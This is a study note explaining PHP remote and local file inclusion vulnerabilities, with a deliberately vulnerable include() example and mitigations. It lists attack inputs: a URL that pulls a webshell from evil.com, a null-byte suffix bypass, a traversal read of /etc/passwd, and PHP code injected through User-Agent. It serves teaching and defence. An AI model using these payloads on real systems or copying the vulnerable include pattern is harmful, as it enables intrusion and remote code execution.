# File inclusion vulnerability

## Features 

- commonly found on run time
- different from **directory traversal attack**
    - d.t.a : is a way of gaining unauthorized file system access
    - f.i.v : suberts how an application loads code for **execution**
- A **successful** exploitation of a file inclusion vulnerability can result in **remote code execution**, and attacker can use remote code execution to create a *webshell* on that web server.



## Types

1. Remote file inclusion (**RFI**): RFI usually occurs when the web application downloads and executes a remote file. These remote files usually obtained in the form of an **HTTP** or **FTP** URI as a user-supplied parameter to the web application.
2. Local file inclusion (**LFI**): LFI is similar to RFI except instead of including remote files, only local files. i.e. files on the current server can be included for execution. This issue can still **lead to RFI** by including a (local) file that contains attacker-controlled data such as **the web server's access log**.



## How 

### 1. PHP:

1. *Most notable*(NOT ALL) are the `include` and `require` statements.
2. Use a URL to retrieve data from remote locations:
    1. PHP <= 4.3.4: `allow_url_fopen = On`, **enable by default**.
    2. PHP >= 5.2.0: `allow_url_include` , but fortunately, in 5.X this directive is **disabled by default**.
3. Attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote host.
4. **HOW TO MITIGATE**: **all** user input **needs to be validated** before being used! **Users can not be trusted!**

#### Example:

Server:

```php
<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

client:

```html
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="french">French</option>
      ...
   </select>
   <input type="submit">
</form>
```

The developer intended to read in `english.php` or `french.php`, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the `language` parameter.

**A few ways to attack this**

1. `?language=http://evil.com/webshell.txt?` - injects a remotely hosted file containing malicious code (**RFI**)
2. `?language=C:\\ftp\\upload\\expolit` - executes code from an already uploaded file called 'exploit.php' (**LFI**)
3. `?language=C:\\data.txt%00` - using **NULL meta character** to remove the `.php` suffix, allowing access to files other than .php. **BTW**: this use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks!!!
4. `?language=../../../../etc/passwd%00` - allows attackers to read the contents of the `/etc/passwd` file through a **directory traversal attack**.
5. An attacker can also modify a [HTTP](https://en.wikipedia.org/wiki/HTTP) header (such as `User-Agent`) in this attack to be PHP code to exploit [remote code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution).

**Solution to mitigate this vulnerability**

1. use a whitelist of accepted language parameters. 
2. do input filtering
3. rely upon validation of the passwd-in path to make sure it **does not contain ** unintended characters and character patterns.
4. [**best**] use a predefined **switch/case** statement to determine which file to include rather than use an URL  or form parameter to dynamically generate the path.

**Patch it!**

Server:

```php
<?php
    if (isset($_GET['language']){
        switch ($_GET['language']){
            case 'english':
                xxx;
            case 'french':
                xxx;
            ...
        }
    }
?>
```

